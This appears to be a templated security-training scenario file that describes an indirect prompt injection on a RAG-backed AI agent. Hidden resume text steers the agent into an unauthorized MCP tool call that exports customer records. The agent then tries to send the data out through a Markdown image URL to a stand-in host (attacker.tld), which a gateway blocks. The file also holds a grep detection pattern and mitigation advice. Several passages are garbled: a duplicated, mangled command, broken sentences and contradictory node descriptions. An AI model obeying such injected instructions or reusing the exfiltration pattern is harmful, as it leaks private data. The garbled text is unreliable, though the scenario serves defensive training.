scenario.name: OWASP LLM01:2025, NIST AI 100-2 & MITRE ATLAS AML.T0051 — Indirect Prompt Injection via RAG Vector Retrieval & Agent/MCP Tool Audit
scenario.shortSubtitle: AI, LLM Agents & MLOps Security · T1190
scenario.overview: Imagine an executive assistant who reads outside resumes from a shared filing cabinet and has direct access to internal company tools. An outsider slips invisible margin notes onto a harmless-looking resume instructing the assistant to ignore their boss, secretly look up private customer folders through an internal tool, and mail the stolen answers outside disguised as a tiny decorative picture link, until the company’s strict mailroom gate blocks the hidden link. In this scenario (T1190, OWASP LLM01:2025, NIST AI 100-2 & MITRE ATLAS AML.T0051, Indirect Prompt Injection via RAG Vector Retrieval & Agent/MCP Tool Audit), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: untrusted Document Embedding, then unauthorized Agent Tool Call Generation, then deterministic Policy Gate Interception. Steps #1–#3 walk that chain end-to-end by covering Untrusted Document Embedding, then Unauthorized Agent Tool Call Generation, then Deterministic Policy Gate Interception, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection correlates process, authentication, and network telemetry for T1190 across the documented kill chain.

stages.subtitle: Initial Access (T1190 - Indirect Prompt Injection via Retrieved RAG Context / AML.T0051.001)
stages.description: An external applicant submits a normal-looking resume or support ticket containing hidden override instructions buried in fine print; the automated librarian indexes that file into the reference cabinets and later hands the poisoned excerpt straight to the assistant during a routine question. stages.title: Stage 2: Unauthorized Agent Tool Call Generation (MCP tool_calls JSON Invocation)
stages.subtitle: Execution (T1059 - Agent Tool & Function Calling Abuse / OWASP LLM06 Excessive Agency)
stages.description: Reading the poisoned reference page alongside their manager’s genuine question, the confused assistant mistakes the fine print for a direct executive order and fills out a structured work-tool slip requesting sensitive customer records from the internal service desk. When the LLM processes the untrusted RAG chunk alongside the user prompt, the injected directive instructs the model to emit a structured tool_calls JSON payload targeting an internal MCP server tool (such as query_customer_db or send_webhook) (logged in Application Log Event 1052 with McpToolInvoked=export_directory_records, ContextTaintStatus=context_tainted_by_untrusted_rag = true, SecurityStandard=NIST AI 100-2 & OWASP LLM06 , Excessive Agency so analysts can verify the exact actor and target artifact). On the diagram, follow Step #2 / Link #2 (#2→ mcp.call_tool(name="export_directory_records", arguments={"filter":"*"}) / ⇠#2 ACK 1052) from Node ② (#2 Perimeter Firewall & NDR Tap) to Node ③ (#3 Vector DB Top-K RAG Retrieval), monitored by Node ⑥ (#6 Internal MCP Tool / SQL API).

stages.title: Stage 3: Deterministic Policy Gate Interception & Outbound Markdown Image/Link Exfiltration Audit
stages.subtitle: Exfiltration (T1041 - Exfiltration via Rendered Markdown URI / AI Gateway Audit)
stages.description: After receiving the private customer summary back from the desk, the hidden margin note tries to smuggle the secret text outside by embedding it inside the address of an external decorative picture, but the building’s strict rendering gate strips unknown external images and logs the blocked smuggling attempt. If the tool output is returned to the model, indirect injection payloads often attempt to exfiltrate the result by rendering an external Markdown image URL (![tracker], https://attacker.tld/collect?data=...). Content Security Policy (CSP) img-src rules and AI gateway egress filters block and log the attempt (logged in IDS Alert Event 1053 with GuardrailDecision=BLOCKED , Tainted Context Policy Enforcement, AtlasTechnique=MITRE ATLAS AML.T0051 & AML.T0048, DefensiveControl=Deterministic Taint Tracking + CSP img-src Isolation so analysts can verify the exact actor and target artifact). Under the hood, the observed step executes grep -E "\!\[.*\]\(https?://" /var/log/ai-gateway/response-audit.log , which executes the technical command / telemetry directive , grep -E "\!\[.*\]\, https?://" /var/log/ai-gateway/response-audit.log via System / Runtime E so that advances the scenario kill-chain under MITRE T1041 during "Deterministic Policy Gate Interception & Outbound Markdown Image/Link Exfiltration Audit" , If the tool output is returned to the model, indirect injection payloads often attempt to exfiltrate the result by rendering an external Markdown image URL , while generating verifiable host or network telemetry for DFIR attribution. In the documented EventID 1053 exchange from Vector DB Top-K RAG Retrieval to LLM Agent & Tool Orchestrator, LLM Agent & Tool Orchestrator responds with ALERT 1053 (confirming that the AI Gateway Policy Block: Tainted Context Tool Invocation & External Markdown URI request succeeded on LLM Agent & Tool Orchestrator and completing the final execution objective of OWASP LLM01:2025, NIST AI 100-2 & MITRE ATLAS AML.T0051, Indirect Prompt Injection via RAG Vector Retrieval & Agent/MCP Tool Audit). On the diagram, follow Step #3 / Link #3 (#3→ AI Gateway Policy Block: Tainted Context Tool Invocation & External Markdown URI / ⇠#3 ALERT 1053) from Node ③ (#3 Vector DB Top-K RAG Retrieval) to Node ④ (#4 LLM Agent & Tool Orchestrator), monitored by Node ⑥ (#6 Internal MCP Tool / SQL API).
stages.mitreTechniqueName: Exfiltration via Rendered Markdown URI / AI Gateway Audit

keySpecs.value: Strip or proxy external Markdown images and links in LLM UI renderers, enforce a strict Content-Security-Policy (img-src 'self'), and block autonomous tool calls when the prompt taint flag is set.
Exfiltration (T1041 - Exfiltration via Rendered Markdown URI / AI Gateway Audit)
